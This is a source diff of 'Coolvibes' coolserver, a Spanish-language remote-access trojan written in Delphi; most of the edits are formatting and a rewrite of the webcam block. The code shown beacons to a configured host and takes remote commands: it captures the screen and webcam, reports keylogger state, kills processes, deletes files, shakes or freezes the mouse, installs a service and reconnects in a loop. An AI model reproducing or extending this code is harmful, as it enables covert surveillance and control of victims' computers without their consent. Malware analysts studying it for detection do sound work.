@@ -12,13 +12,13 @@
 
      El equipo Coolvibes
 *)
-//library CoolServer;
-program coolserver;
+library coolserver;
+//Program coolserver;
 uses
   Windows,
   SysUtils,
-  //  ScktComp,
-  //  MMSystem, Elimina: mcisendstring
+  // ScktComp,
+  // MMSystem, Elimina: mcisendstring
   ShellAPI,
   Classes,
   lomtask,
@@ -33,8 +33,8 @@ uses
   UnitRegistro,
   MiniReg,
   UnitVariables,
-  unitCapScreen,  //Se activa de nuevo
-  unitCamScreen, //Webcam
+  unitCapScreen, //Se activa de nuevo
+  unitCamScreen, //WebCam
   unitAvs,
   UnitCambioId,
   SettingsDef,
@@ -47,7 +47,7 @@ uses
 
 type
   TDescarga = record
-    Descargado: int64;  //Datos descargados
+    Descargado: int64; //Datos descargados
     SizeFile:   int64;
   end;
   {
@@ -57,7 +57,7 @@ type
     procedure ClientSocketRead(Sender: TObject; Socket: TCustomWinSocket);
     procedure ClientSocketReadFile(Sender: TObject; Socket: TCustomWinSocket);
     procedure ClientSocketError(Sender: TObject; Socket: TCustomWinSocket;
-      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
+    ErrorEvent: TErrorEvent; var ErrorCode: Integer);
     procedure ClientSocketOnConnect(Sender: TObject; Socket: TCustomWinSocket);
   end;
    }
@@ -90,7 +90,7 @@ const
     //Aquí va la carga de opciones del editor. Inicializamos las variables configurables del troyano
     //que están todas dentro de un record (Configuracion : TSettings).
 
-      //0.53 hay que cargar la configuración de memoria
+    //0.53 hay que cargar la configuración de memoria
     VersionDelServer := '0.54';
     MCompartida:=OpenFileMapping(FILE_MAP_READ,False,'Config');
 
@@ -98,8 +98,8 @@ const
     if(MCompartida <> 0) then //Leida con Éxito :D
     begin
       ConfigCompartida:=MapViewOfFile(Mcompartida,FILE_MAP_READ,0,0,0);
-           //quizás habría que guardar esta configuración cifrada...
-      Configuracion.sHosts                    :=   ConfigCompartida.sHosts;
+      //Quizás habría que guardar esta configuración cifrada...
+      Configuracion.sHosts                   :=   ConfigCompartida.sHosts;
       Configuracion.sID                      :=   ConfigCompartida.sID;
       Configuracion.bCopiarArchivo           :=   ConfigCompartida.bCopiarArchivo;
       Configuracion.sFileNameToCopy          :=   ConfigCompartida.sFileNameToCopy;
@@ -116,9 +116,9 @@ const
       CloseHandle(MCompartida);
     end
     else
-    begin    //Para debug
+    begin //Para debug
       //ExitProcess(0);
-      Configuracion.sHosts   := '127.0.0.1:80¬';
+      Configuracion.sHosts  := '127.0.0.1:80¬';
       Configuracion.sID     := 'Coolserver';
       Configuracion.bCopiarArchivo := False; //Me copio o no?
       Configuracion.sFileNameToCopy := 'coolserver.exe';
@@ -144,7 +144,7 @@ const
 
     if ((getTickCount() - lastCommandTime) < 20000) then
       Exit;
-    //No ha pasado 20 seg idle asi que no mando ping: (getTickCount - lastCommandTime)
+    //No ha pasado 20 seg. idle asi que no mando ping: (getTickCount - lastCommandTime)
 
     if not busy then
     begin
@@ -154,9 +154,9 @@ const
         //Ya habia enviado el ping
         if not pongReceived then
         begin
-          //No recibi el pong asi que me voy a desconectar
+          //No recibi el ping asi que me voy a desconectar
           sock.Disconnect;
-          //Ya me desconecte
+          //Ya me desconecté
         end
         else
         begin
@@ -184,7 +184,7 @@ const
   var
     Msg: TMsg;
   begin
-//    ShowMessage('Soy el keepalive thread!!');
+    //ShowMessage('Soy el keepalive thread!!');
     KeepAliveTimer(10000);
     while (GetMessage(Msg, 0, 0, 0)) do
     begin
@@ -269,10 +269,9 @@ end;
   begin
     try
       begin
-        sock := TCLientSocket.Create;  //Socket principal
+        sock := TCLientSocket.Create; //Socket principal
         CSocket := TClientSocket.Create; //Socket Captura de Pantalla, captura de webcam y thumbnails   
-             if indice = '' then
-        indice := configuracion.shosts;
+        if indice = '' then indice := configuracion.shosts;
         host := Copy(indice, 1, Pos(':', indice) -1 );
         Delete(indice, 1, Pos(':', indice));
         Port := strtointdef(Copy(indice, 1, Pos('¬', indice) -1 ),80);
@@ -285,41 +284,41 @@ end;
 
           Busy := True;
 
-          if Recibido = 'PING' then  //Respuesta a pings
+          if Recibido = 'PING' then //Respuesta a pings
           begin
-           Respuesta :=  
+            Respuesta :=
               Sock.LocalAddress + '|' +LeerID() + '|' + GetCPU() + '|' +
               GetOS() + '|' + VersionDelServer + '|L|'+GetActiveWindowCaption()+'|'+
-               GetIdleTime()+ '|'+GetUptime()+'|';
+              GetIdleTime()+ '|'+GetUptime()+'|';
             SendText('PONG|'+Respuesta+ ENTER);
-            //    Exit;
+            // Exit;
           end;
 
           if Recibido = 'PONG' then
           begin
             pongReceived := True;
-            //    Exit;
+            // Exit;
           end;
 
-  {Información mostrada en el ListView de conexiones del cliente, se recibe tambien
-  el SocketHandle del cliente, que lo usaremos para relaccionar la conexión principal
-  con la conexión para enviar y recibir ficheros}
+          {Información mostrada en el ListView de conexiones del cliente, se recibe tambien
+          el SocketHandle del cliente, que lo usaremos para relaccionar la conexión principal
+          con la conexión para enviar y recibir ficheros}
           if Copy(Recibido, 1, 8) = 'MAININFO' then
           begin
             Delete(Recibido, 1, 9);  // 'MAININFO|123456'
             SH := StrToInt(Recibido);
-{    Cliente.ClientSocketFiles := TClientSocket.Create(nil);
-    Cliente.ClientSocketFiles.Host := Configuracion.sHost;
-    Cliente.ClientSocketFiles.Port := Configuracion.iPort;
-    Cliente.ClientSocketFiles.OnRead := Cliente.ClientSocketReadFile;
-    Cliente.ClientSocketFiles.OnConnect := Cliente.ClientSocketOnConnect;
-    Cliente.ClientSocketFiles.OnError := Cliente.ClientSocketError;
-    Cliente.ClientSocketFiles.Open;
+{           Cliente.ClientSocketFiles := TClientSocket.Create(nil);
+            Cliente.ClientSocketFiles.Host := Configuracion.sHost;
+            Cliente.ClientSocketFiles.Port := Configuracion.iPort;
+            Cliente.ClientSocketFiles.OnRead := Cliente.ClientSocketReadFile;
+            Cliente.ClientSocketFiles.OnConnect := Cliente.ClientSocketOnConnect;
+            Cliente.ClientSocketFiles.OnError := Cliente.ClientSocketError;
+            Cliente.ClientSocketFiles.Open;
  }
             Respuesta := Sock.LocalAddress + '|' +  //IP privada
               LeerID() + '|' + GetCPU() + '|' +
               GetOS() + '|' + VersionDelServer + '|1|'+GetActiveWindowCaption()+'|'+
-               GetIdleTime()+ '|'+GetUptime()+'|';
+              GetIdleTime()+ '|'+GetUptime()+'|';
 
             SendText('MAININFO|' + Respuesta + ENTER);
           end;
@@ -388,8 +387,8 @@ end;
             SendText('PROC|' + Respuesta + ENTER);
           end;
 
-  {Si los primeros ocho caracteres son 'KILLPROC', significa que hay que matar
-  un proceso. Saca el PID y mata ese proceso. Sintaxis del comando: KILLPROC|<PID>}
+          {Si los primeros ocho caracteres son 'KILLPROC', significa que hay que matar
+          un proceso. Saca el PID y mata ese proceso. Sintaxis del comando: KILLPROC|<PID>}
           if Copy(Recibido, 1, 8) = 'KILLPROC' then
           begin
             Delete(Recibido, 1, 9);
@@ -508,14 +507,14 @@ end;
             Delete(Recibido, 1, 16); //Borra 'MOUSETEMBLOROSO|' de la cadena
             if Recibido = 'ACTIVAR' then
             begin
-              //activar mouse tembloroso
+              //Activar mouse tembloroso
               CongelarMouse(False); //Lo descongela si está congelado
               TemblarMouse(True);
               SendText('MOUSETEMBLOROSO|Activado' + ENTER);
             end
             else
             begin
-              //desactivar mouse tembloroso
+              //Desactivar mouse tembloroso
               TemblarMouse(False);
               SendText('MOUSETEMBLOROSO|Desactivado' + ENTER);
             end;
@@ -526,14 +525,14 @@ end;
             Delete(Recibido, 1, 14); //Borra 'CONGELARMOUSE|' de la cadena
             if Recibido = 'ACTIVAR' then
             begin
-              //activar congelar mouse
+              //Activar congelar mouse
               TemblarMouse(False); //El mouse para de temblar si se congela
               CongelarMouse(True);
               SendText('CONGELARMOUSE|Activado' + ENTER);
             end
             else
             begin
-              //desactivar congelar mouse
+              //Desactivar congelar mouse
               CongelarMouse(False);
               SendText('CONGELARMOUSE|Desactivado' + ENTER);
             end;
@@ -544,14 +543,14 @@ end;
             Delete(Recibido, 1, 8); //Borra 'ABRIRCD|' de la cadena
             if Recibido = 'ACTIVAR' then
             begin
-              //abrir cd
-              //      mciSendString( 'Set cdaudio door open wait', nil, 0, hInstance);
+              //Abrir CD
+              //mciSendString( 'Set cdaudio door open wait', nil, 0, hInstance);
               SendText('ABRIRCD|Activado' + ENTER);
             end
             else
             begin
-              //cerrar cd
-              //      mciSendString( 'Set cdaudio door closed wait' , nil , 0 , hInstance );
+              //Cerrar CD
+              //mciSendString( 'Set cdaudio door closed wait' , nil , 0 , hInstance );
               SendText('ABRIRCD|Desactivado' + ENTER);
             end;
           end;
@@ -613,7 +612,7 @@ end;
                   Tipo + MB_ABORTRETRYIGNORE);
               else
                 BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1), Tipo + MB_OK);
-                //nunca debería pasar pero es mejor prevenir
+                //Nunca debería pasar pero es mejor prevenir
             end;
             case BotonPulsado of
               idOk: SendText('MSG|El usuario respondió: OK' + ENTER);
@@ -691,7 +690,6 @@ end;
             end
             else //el archivo no existe.... Se supone que nunca o muy pocas veces debería pasar.
               SendText('MSG|El archivo no existe. Tal vez ya fue borrado.' + ENTER);
-
           end;
 
           //Borrar carpeta
@@ -872,7 +870,7 @@ end;
 
                  end;
           end;
-          //Fin del código para capturar pantalla
+          //Fin del código para capturar la pantalla
 
           if Copy(recibido, 1, 8) = 'CAMBIOID' then
           begin
@@ -880,42 +878,43 @@ end;
             CambiarID(trim(recibido));
           end;
 
-          //Comandos relaccionados con la webcam
-          if Copy(recibido, 1, 13) = 'LISTARWEBCAMS' then
-                SendText('LISTARWEBCAMS|' + ListarDispositivos + ENTER);
+          //Código para capturar la WebCam
+          if Recibido = 'LISTARWEBCAMS' then
+          begin
+            TempStr := '';
+            TempStr := ListarDispositivos;
+            SendText('LISTARWEBCAMS|' + TempStr + ENTER);
+          end;
+          if Copy(recibido, 1, 13) = 'CAPTURAWEBCAM' then
+          begin
+            Delete(recibido, 1, 13);
+            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Numero de webcam
+            Delete(Recibido, 1, Pos('|', Recibido));
 
-            if Copy(recibido, 1, 13) = 'CAPTURAWEBCAM' then
+            if not (CSocket.Connected) then //Si no estamos conectados conectamos entonces
             begin
-              Delete(recibido, 1, 13);
-              TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);  //Numero de webcam
-              Delete(Recibido, 1, Pos('|', Recibido));
-
-                 if not (CSocket.Connected) then   //si no estamos conectados conectamos...
-                 begin
-                  CSocket.Connect(Host, Port);    //conectamos
-                 end;
-                  CSocket.SendString('SH|'+inttostr(SH) + ENTER); //nos identificamos
-
-                // while CSocket.Connected do  //
-                if CSocket.Connected then
-                 begin
-
-                  MS := TMemoryStream.create;   //MS de la captura de Pantalla
-                  MS.Position := 0;
-                  CapturarWebcam(MS,StrToInt(TempStr),strtoint(Recibido));
-                  MS.Position := 0;
-                  Csocket.SendString('CAPTURAWEBCAM|C|' + IntToStr(MS.size) + ENTER);  //mandamos el tamaño
-                  TempStr := '';
-                  SetLength(TempStr, ms.size);
-                  Ms.Read(TempStr[1], ms.size);
-                  MS.Free;
-                  MS := nil;
-                  CSocket.SendString(Tempstr);    //GOGOGO
-
-                 end;
-
-              //SendText ('<WEBCONWAY>' + IntToStr(TheFileSize) + '|'+ENTER);
+              CSocket.Connect(Host, Port); //conectamos
             end;
+            CSocket.SendString('SH|'+inttostr(SH) + ENTER); //Nos identificamos
+
+            // while CSocket.Connected do //
+            if CSocket.Connected then
+            begin
+              MS := TMemoryStream.create; //MS de la captura de Pantalla
+              MS.Position := 0;
+              CapturarWebcam(MS,StrToInt(TempStr),strtoint(Recibido));
+              MS.Position := 0;
+              Csocket.SendString('CAPTURAWEBCAM|C|' + IntToStr(MS.size) + ENTER); //Mandamos el tamaño
+              TempStr := '';
+              SetLength(TempStr, ms.size);
+              Ms.Read(TempStr[1], ms.size);
+              MS.Free;
+              MS := nil;
+              CSocket.SendString(Tempstr); //GOGOGO
+            end;
+          //SendText ('<WEBCONWAY>' + IntToStr(TheFileSize) + '|'+ENTER);
+          end;
+          //Fin del código para capturar la WebCam
 
           if copy(Recibido, 1, 6) = 'MOUSEP' then
           begin
@@ -1116,7 +1115,6 @@ end;
             SendText('MSG|Se ha intentado instalar el servicio' + ENTER);
           end;
 
-          // KEYLOGGER!
           if Recibido = 'ESTADOKEYLOGGER' then
             SendText('ESTADOKEYLOGGER|'+BooleanToStr(ObtenerEstadoKeylogger, 'ACTIVADO', 'DESACTIVADO')+'|'+GetKeyloggerPath+'|'+ENTER);
 
@@ -1252,7 +1250,7 @@ begin
   OnServerInitKeylogger();
   while True do
   begin
-    //  Conectar();
+    // Conectar();
     iniciar();
     sleep(1000 * 10);//duermo 10 seg antes de conectar de nuevo
   end;
